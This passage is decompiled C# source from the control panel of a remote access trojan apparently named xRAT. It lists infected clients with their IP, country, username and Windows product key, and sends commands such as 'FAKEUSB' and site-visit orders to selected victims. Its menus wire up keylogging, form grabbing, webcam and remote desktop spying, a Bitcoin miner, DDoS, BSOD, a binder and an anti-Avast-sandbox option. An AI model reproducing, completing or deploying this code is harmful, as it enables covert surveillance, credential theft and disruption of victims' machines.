                    string text = item.Text;
                    item.Text = text;
                    this.lstClients.Items[i].SubItems[8].Text = Conversions.ToString(this.GetPingMs(ref text));
                }
            }
            if (this.autosize == 1)
            {
                this.AppNewAutosizeColumns(this.lstClients);
            }
        }

        public void ToggleListen()
        {
            this.listening = true;
            this.enable = false;
        }

        private void ToolStripTextBox14_Click(object sender, EventArgs e)
        {
        }

        private void TracerouteIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_12().Show();
        }

        public void UpdateStatus(xRAT.Connection client, string Message)
        {
            IEnumerator enumerator;
            try
            {
                enumerator = this.lstClients.Items.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    ListViewItem current = (ListViewItem) enumerator.Current;
                    if (Operators.ConditionalCompareObjectEqual(current.Text, client.Object_0, false))
                    {
                        current.SubItems[2].Text = Message;
                        string str2 = Conversions.ToString(this.GetPingMs(ref Conversions.ToString(client.Object_0)));
                        current.SubItems[8].Text = str2;
                    }
                }
            }
            finally
            {
                if (enumerator is IDisposable)
                {
                    (enumerator as IDisposable).Dispose();
                }
            }
        }

        public void UpdateStatusFilemanager(string Message)
        {
            Class2.Class4_0.method_5().Label2.Text = Message;
        }

        private void UsbToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("FAKEUSB");
            }
        }

        private void UsernameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstusername.Width == Conversions.ToDouble("0"))
            {
                this.lstusername.Width = Conversions.ToInteger("135");
            }
            else
            {
                this.lstusername.Width = Conversions.ToInteger("0");
            }
        }

        private void VersionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstversion.Width == Conversions.ToDouble("0"))
            {
                this.lstversion.Width = Conversions.ToInteger("50");
            }
            else
            {
                this.lstversion.Width = Conversions.ToInteger("0");
            }
        }

        private void ViewRemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_20().ShowDialog();
            }
        }

        private void VisitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_16().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("VIVISTEWEB|", Class2.Class4_0.method_16().URL)));
            }
        }

        private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_26().Show();
            }
        }

        private void WindowsKeyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstwinprckey.Width == Conversions.ToDouble("0"))
            {
                this.lstwinprckey.Width = Conversions.ToInteger("140");
            }
            else
            {
                this.lstwinprckey.Width = Conversions.ToInteger("0");
            }
        }

        internal virtual ToolStripMenuItem AntiAvastSandBoxToolStripMenuItem
        {
            get
            {
                return this._AntiAvastSandBoxToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.AntiAvastSandBoxToolStripMenuItem_Click);
                if (this._AntiAvastSandBoxToolStripMenuItem != null)
                {
                    this._AntiAvastSandBoxToolStripMenuItem.Click -= handler;
                }
                this._AntiAvastSandBoxToolStripMenuItem = value;
                if (this._AntiAvastSandBoxToolStripMenuItem != null)
                {
                    this._AntiAvastSandBoxToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem AttackToolStripMenuItem
        {
            get
            {
                return this._AttackToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.AttackToolStripMenuItem_Click);
                if (this._AttackToolStripMenuItem != null)
                {
                    this._AttackToolStripMenuItem.Click -= handler;
                }
                this._AttackToolStripMenuItem = value;
                if (this._AttackToolStripMenuItem != null)
                {
                    this._AttackToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem BinderToolStripMenuItem
        {
            get
            {
                return this._BinderToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._BinderToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem BinderToolStripMenuItem1
        {
            get
            {
                return this._BinderToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.BinderToolStripMenuItem1_Click);
                if (this._BinderToolStripMenuItem1 != null)
                {
                    this._BinderToolStripMenuItem1.Click -= handler;
                }
                this._BinderToolStripMenuItem1 = value;
                if (this._BinderToolStripMenuItem1 != null)
                {
                    this._BinderToolStripMenuItem1.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem BipSoundToolStripMenuItem
        {
            get
            {
                return this._BipSoundToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.BipSoundToolStripMenuItem_Click);
                if (this._BipSoundToolStripMenuItem != null)
                {
                    this._BipSoundToolStripMenuItem.Click -= handler;
                }
                this._BipSoundToolStripMenuItem = value;
                if (this._BipSoundToolStripMenuItem != null)
                {
                    this._BipSoundToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem BitCoinMinerToolStripMenuItem
        {
            get
            {
                return this._BitCoinMinerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.BitCoinMinerToolStripMenuItem_Click);
                if (this._BitCoinMinerToolStripMenuItem != null)
                {
                    this._BitCoinMinerToolStripMenuItem.Click -= handler;
                }
                this._BitCoinMinerToolStripMenuItem = value;
                if (this._BitCoinMinerToolStripMenuItem != null)
                {
                    this._BitCoinMinerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem BotkillToolStripMenuItem
        {
            get
            {
                return this._BotkillToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._BotkillToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem BSODToolStripMenuItem
        {
            get
            {
                return this._BSODToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.BSODToolStripMenuItem_Click);
                if (this._BSODToolStripMenuItem != null)
                {
                    this._BSODToolStripMenuItem.Click -= handler;
                }
                this._BSODToolStripMenuItem = value;
                if (this._BSODToolStripMenuItem != null)
                {
                    this._BSODToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual Button Button2
        {
            get
            {
                return this._Button2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button2_Click);
                if (this._Button2 != null)
                {
                    this._Button2.Click -= handler;
                }
                this._Button2 = value;
                if (this._Button2 != null)
                {
                    this._Button2.Click += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox1
        {
            get
            {
                return this._CheckBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox1 = value;
            }
        }

        internal virtual ToolStripMenuItem ClearTraceHistoryToolStripMenuItem
        {
            get
            {
                return this._ClearTraceHistoryToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ClearTraceHistoryToolStripMenuItem_Click);
                if (this._ClearTraceHistoryToolStripMenuItem != null)
                {
                    this._ClearTraceHistoryToolStripMenuItem.Click -= handler;
                }
                this._ClearTraceHistoryToolStripMenuItem = value;
                if (this._ClearTraceHistoryToolStripMenuItem != null)
                {
                    this._ClearTraceHistoryToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem CloseCDToolStripMenuItem
        {
            get
            {
                return this._CloseCDToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CloseCDToolStripMenuItem_Click);
                if (this._CloseCDToolStripMenuItem != null)
                {
                    this._CloseCDToolStripMenuItem.Click -= handler;
                }
                this._CloseCDToolStripMenuItem = value;
                if (this._CloseCDToolStripMenuItem != null)
                {
                    this._CloseCDToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem CloseToolStripMenuItem
        {
            get
            {
                return this._CloseToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CloseToolStripMenuItem_Click);
                if (this._CloseToolStripMenuItem != null)
                {
                    this._CloseToolStripMenuItem.Click -= handler;
                }
                this._CloseToolStripMenuItem = value;
                if (this._CloseToolStripMenuItem != null)
                {
                    this._CloseToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ColumnHeader ColumnHeader7
        {
            get
            {
                return this.columnHeader_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_0 = value;
            }
        }

        internal virtual ColumnHeader ColumnHeader8
        {
            get
            {
                return this.columnHeader_1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_1 = value;
            }
        }

        internal virtual ComboBox ComboBox1
        {
            get
            {
                return this._ComboBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ComboBox1_SelectedIndexChanged);
                if (this._ComboBox1 != null)
                {
                    this._ComboBox1.SelectedIndexChanged -= handler;
                }
                this._ComboBox1 = value;
                if (this._ComboBox1 != null)
                {
                    this._ComboBox1.SelectedIndexChanged += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ComputerNameToolStripMenuItem
        {
            get
            {
                return this._ComputerNameToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ComputerNameToolStripMenuItem_Click);
                if (this._ComputerNameToolStripMenuItem != null)
                {
                    this._ComputerNameToolStripMenuItem.Click -= handler;
                }
                this._ComputerNameToolStripMenuItem = value;
                if (this._ComputerNameToolStripMenuItem != null)
                {
                    this._ComputerNameToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ComputerToolStripMenuItem
        {
            get
            {
                return this._ComputerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ComputerToolStripMenuItem = value;
            }
        }

        internal virtual ContextMenuStrip ContextMenuStrip1
        {
            get
            {
                return this._ContextMenuStrip1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ContextMenuStrip1 = value;
            }
        }

        internal virtual ContextMenuStrip ContextMenuStrip2
        {
            get
            {
                return this._ContextMenuStrip2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ContextMenuStrip2 = value;
            }
        }

        internal virtual ContextMenuStrip ContextMenuStrip3
        {
            get
            {
                return this._ContextMenuStrip3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ContextMenuStrip3 = value;
            }
        }

        internal virtual ToolStripMenuItem CountryToolStripMenuItem
        {
            get
            {
                return this._CountryToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CountryToolStripMenuItem_Click);
                if (this._CountryToolStripMenuItem != null)
                {
                    this._CountryToolStripMenuItem.Click -= handler;
                }
                this._CountryToolStripMenuItem = value;
                if (this._CountryToolStripMenuItem != null)
                {
                    this._CountryToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem DDOSToolStripMenuItem
        {
            get
            {
                return this._DDOSToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._DDOSToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem DisableMouseAndKeyboardToolStripMenuItem
        {
            get
            {
                return this._DisableMouseAndKeyboardToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.DisableMouseAndKeyboardToolStripMenuItem_Click);
                if (this._DisableMouseAndKeyboardToolStripMenuItem != null)
                {
                    this._DisableMouseAndKeyboardToolStripMenuItem.Click -= handler;
                }
                this._DisableMouseAndKeyboardToolStripMenuItem = value;
                if (this._DisableMouseAndKeyboardToolStripMenuItem != null)
                {
                    this._DisableMouseAndKeyboardToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem EnableMouseAndKeyboardToolStripMenuItem
        {
            get
            {
                return this._EnableMouseAndKeyboardToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.EnableMouseAndKeyboardToolStripMenuItem_Click);
                if (this._EnableMouseAndKeyboardToolStripMenuItem != null)
                {
                    this._EnableMouseAndKeyboardToolStripMenuItem.Click -= handler;
                }
                this._EnableMouseAndKeyboardToolStripMenuItem = value;
                if (this._EnableMouseAndKeyboardToolStripMenuItem != null)
                {
                    this._EnableMouseAndKeyboardToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem EToolStripMenuItem
        {
            get
            {
                return this._EToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._EToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem ExitToolStripMenuItem
        {
            get
            {
                return this._ExitToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ExitToolStripMenuItem_Click);
                if (this._ExitToolStripMenuItem != null)
                {
                    this._ExitToolStripMenuItem.Click -= handler;
                }
                this._ExitToolStripMenuItem = value;
                if (this._ExitToolStripMenuItem != null)
                {
                    this._ExitToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ExitToolStripMenuItem1
        {
            get
            {
                return this._ExitToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ExitToolStripMenuItem1_Click);
                if (this._ExitToolStripMenuItem1 != null)
                {
                    this._ExitToolStripMenuItem1.Click -= handler;
                }
                this._ExitToolStripMenuItem1 = value;
                if (this._ExitToolStripMenuItem1 != null)
                {
                    this._ExitToolStripMenuItem1.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ExtensionChangerToolStripMenuItem
        {
            get
            {
                return this._ExtensionChangerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ExtensionChangerToolStripMenuItem_Click);
                if (this._ExtensionChangerToolStripMenuItem != null)
                {
                    this._ExtensionChangerToolStripMenuItem.Click -= handler;
                }
                this._ExtensionChangerToolStripMenuItem = value;
                if (this._ExtensionChangerToolStripMenuItem != null)
                {
                    this._ExtensionChangerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ExtraToolStripMenuItem
        {
            get
            {
                return this._ExtraToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.method_14);
                EventHandler handler2 = new EventHandler(this.method_13);
                if (this._ExtraToolStripMenuItem != null)
                {
                    this._ExtraToolStripMenuItem.MouseLeave -= handler;
                    this._ExtraToolStripMenuItem.MouseEnter -= handler2;
                }
                this._ExtraToolStripMenuItem = value;
                if (this._ExtraToolStripMenuItem != null)
                {
                    this._ExtraToolStripMenuItem.MouseLeave += handler;
                    this._ExtraToolStripMenuItem.MouseEnter += handler2;
                }
            }
        }

        internal virtual ToolStripMenuItem FacebookToolStripMenuItem
        {
            get
            {
                return this._FacebookToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._FacebookToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem FileManagerToolStripMenuItem
        {
            get
            {
                return this._FileManagerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.FileManagerToolStripMenuItem_Click);
                if (this._FileManagerToolStripMenuItem != null)
                {
                    this._FileManagerToolStripMenuItem.Click -= handler;
                }
                this._FileManagerToolStripMenuItem = value;
                if (this._FileManagerToolStripMenuItem != null)
                {
                    this._FileManagerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem FileToolStripMenuItem
        {
            get
            {
                return this._FileToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.method_16);
                EventHandler handler2 = new EventHandler(this.method_15);
                if (this._FileToolStripMenuItem != null)
                {
                    this._FileToolStripMenuItem.MouseLeave -= handler;
                    this._FileToolStripMenuItem.MouseEnter -= handler2;
                }
                this._FileToolStripMenuItem = value;
                if (this._FileToolStripMenuItem != null)
                {
                    this._FileToolStripMenuItem.MouseLeave += handler;
                    this._FileToolStripMenuItem.MouseEnter += handler2;
                }
            }
        }

        internal virtual ToolStripMenuItem FixMouseButtonToolStripMenuItem
        {
            get
            {
                return this._FixMouseButtonToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.FixMouseButtonToolStripMenuItem_Click);
                if (this._FixMouseButtonToolStripMenuItem != null)
                {
                    this._FixMouseButtonToolStripMenuItem.Click -= handler;
                }
                this._FixMouseButtonToolStripMenuItem = value;
                if (this._FixMouseButtonToolStripMenuItem != null)
                {
                    this._FixMouseButtonToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem FormGrabberToolStripMenuItem
        {
            get
            {
                return this._FormGrabberToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.FormGrabberToolStripMenuItem_Click);
                if (this._FormGrabberToolStripMenuItem != null)
                {
                    this._FormGrabberToolStripMenuItem.Click -= handler;
                }
                this._FormGrabberToolStripMenuItem = value;
                if (this._FormGrabberToolStripMenuItem != null)
                {
                    this._FormGrabberToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem FreezeToolStripMenuItem
        {
            get
            {
                return this._FreezeToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._FreezeToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem FunStuffToolStripMenuItem
        {
            get
            {
                return this._FunStuffToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._FunStuffToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem GetIPToolStripMenuItem
        {
            get
            {
                return this._GetIPToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.GetIPToolStripMenuItem_Click);
                if (this._GetIPToolStripMenuItem != null)
                {
                    this._GetIPToolStripMenuItem.Click -= handler;
                }
                this._GetIPToolStripMenuItem = value;
                if (this._GetIPToolStripMenuItem != null)
                {
                    this._GetIPToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual TextBox getloggg
        {
            get
            {
                return this._getloggg;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._getloggg = value;
            }
        }

        internal virtual ToolStripMenuItem GetRecordToolStripMenuItem
        {
            get
            {
                return this._GetRecordToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.GetRecordToolStripMenuItem_Click);
                if (this._GetRecordToolStripMenuItem != null)
                {
                    this._GetRecordToolStripMenuItem.Click -= handler;
                }
                this._GetRecordToolStripMenuItem = value;
                if (this._GetRecordToolStripMenuItem != null)
                {
                    this._GetRecordToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem HideShowColumsToolStripMenuItem
        {
            get
            {
                return this._HideShowColumsToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._HideShowColumsToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem HideTaskbarToolStripMenuItem
        {
            get
            {
                return this._HideTaskbarToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.HideTaskbarToolStripMenuItem_Click);
                if (this._HideTaskbarToolStripMenuItem != null)
                {
                    this._HideTaskbarToolStripMenuItem.Click -= handler;
                }
                this._HideTaskbarToolStripMenuItem = value;
                if (this._HideTaskbarToolStripMenuItem != null)
                {
                    this._HideTaskbarToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ImageList ImageList1
        {
            get
            {
                return this.imageList_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.imageList_0 = value;
            }
        }

        internal virtual ToolStripMenuItem IPAdressToolStripMenuItem
        {
            get
            {
                return this._IPAdressToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.IPAdressToolStripMenuItem_Click);
                if (this._IPAdressToolStripMenuItem != null)
                {
                    this._IPAdressToolStripMenuItem.Click -= handler;
                }
                this._IPAdressToolStripMenuItem = value;
                if (this._IPAdressToolStripMenuItem != null)
                {
                    this._IPAdressToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem KeyloggzeToolStripMenuItem
        {
            get
            {
                return this._KeyloggzeToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.KeyloggzeToolStripMenuItem_Click);
                if (this._KeyloggzeToolStripMenuItem != null)
                {
                    this._KeyloggzeToolStripMenuItem.Click -= handler;
                }
                this._KeyloggzeToolStripMenuItem = value;
                if (this._KeyloggzeToolStripMenuItem != null)
                {
                    this._KeyloggzeToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem KillToolStripMenuItem
        {
            get
            {
                return this._KillToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.KillToolStripMenuItem_Click);
                if (this._KillToolStripMenuItem != null)
                {
                    this._KillToolStripMenuItem.Click -= handler;
                }
                this._KillToolStripMenuItem = value;
                if (this._KillToolStripMenuItem != null)
                {
                    this._KillToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual ToolStripMenuItem LanToolStripMenuItem
        {
            get
            {
                return this._LanToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.LanToolStripMenuItem_Click);
                if (this._LanToolStripMenuItem != null)
                {
                    this._LanToolStripMenuItem.Click -= handler;
                }
                this._LanToolStripMenuItem = value;
                if (this._LanToolStripMenuItem != null)
                {
                    this._LanToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ListenToolStripMenuItem
        {
            get
            {
                return this._ListenToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ListenToolStripMenuItem_Click);
                if (this._ListenToolStripMenuItem != null)
                {
                    this._ListenToolStripMenuItem.Click -= handler;
                }
                this._ListenToolStripMenuItem = value;
                if (this._ListenToolStripMenuItem != null)
                {
                    this._ListenToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ListToolStripMenuItem
        {
            get
            {
                return this._ListToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ListToolStripMenuItem_Click);
                if (this._ListToolStripMenuItem != null)
                {
                    this._ListToolStripMenuItem.Click -= handler;
                }
                this._ListToolStripMenuItem = value;
                if (this._ListToolStripMenuItem != null)
                {
                    this._ListToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ListView ListView1
        {
            get
            {
                return this._ListView1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ListView1 = value;
            }
        }

        internal virtual ListView lstClients
        {
            get
            {
                return this._lstClients;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._lstClients = value;
            }
        }

        internal virtual ColumnHeader lstcountry
        {
            get
            {
                return this.columnHeader_9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_9 = value;
            }
        }

        internal virtual ColumnHeader lstcpname
        {
            get
            {
                return this.columnHeader_5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_5 = value;
            }
        }

        internal virtual ColumnHeader lstipaddress
        {
            get
            {
                return this.columnHeader_2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_2 = value;
            }
        }

        internal virtual ColumnHeader lstopsys
        {
            get
            {
                return this.columnHeader_8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_8 = value;
            }
        }

        internal virtual ColumnHeader lstping
        {
            get
            {
                return this.columnHeader_10;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_10 = value;
            }
        }

        internal virtual ColumnHeader lststatus
        {
            get
            {
                return this.columnHeader_4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_4 = value;
            }
        }

        internal virtual ColumnHeader lstusername
        {
            get
            {
                return this.columnHeader_6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_6 = value;
            }
        }

        internal virtual ColumnHeader lstversion
        {
            get
            {
                return this.columnHeader_3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_3 = value;
            }
        }

        internal virtual ColumnHeader lstwinprckey
        {
            get
            {
                return this.columnHeader_7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.columnHeader_7 = value;
            }
        }

        internal virtual ToolStripMenuItem MatrixScreenToolStripMenuItem
        {
            get
            {
                return this._MatrixScreenToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.MatrixScreenToolStripMenuItem_Click);
                if (this._MatrixScreenToolStripMenuItem != null)
                {
                    this._MatrixScreenToolStripMenuItem.Click -= handler;
                }
                this._MatrixScreenToolStripMenuItem = value;
                if (this._MatrixScreenToolStripMenuItem != null)
                {
                    this._MatrixScreenToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual MenuStrip MenuStrip1
        {
            get
            {
                return this._MenuStrip1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._MenuStrip1 = value;
            }
        }

        internal virtual ToolStripMenuItem MessageBoxToolStripMenuItem1
        {
            get
            {
                return this._MessageBoxToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.MessageBoxToolStripMenuItem1_Click);
                if (this._MessageBoxToolStripMenuItem1 != null)
                {
                    this._MessageBoxToolStripMenuItem1.Click -= handler;
                }
                this._MessageBoxToolStripMenuItem1 = value;
                if (this._MessageBoxToolStripMenuItem1 != null)
                {
                    this._MessageBoxToolStripMenuItem1.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem MsnControlToolStripMenuItem
        {
            get
            {
                return this._MsnControlToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._MsnControlToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem NoipUpdateToolStripMenuItem
        {
            get
            {
                return this._NoipUpdateToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.NoipUpdateToolStripMenuItem_Click);
                if (this._NoipUpdateToolStripMenuItem != null)
                {
                    this._NoipUpdateToolStripMenuItem.Click -= handler;
                }
                this._NoipUpdateToolStripMenuItem = value;
                if (this._NoipUpdateToolStripMenuItem != null)
                {
                    this._NoipUpdateToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual NotifyIcon NotifyIcon1
        {
            get
            {
                return this.notifyIcon_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                MouseEventHandler handler = new MouseEventHandler(this.NotifyIcon1_MouseClick);
                if (this.notifyIcon_0 != null)
                {
                    this.notifyIcon_0.MouseClick -= handler;
                }
                this.notifyIcon_0 = value;
                if (this.notifyIcon_0 != null)
                {
                    this.notifyIcon_0.MouseClick += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem NumberOfConnectionsMaxToolStripMenuItem
        {
            get
            {
                return this._NumberOfConnectionsMaxToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._NumberOfConnectionsMaxToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem
        {
            get
            {
                return this._OkToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem_Click);
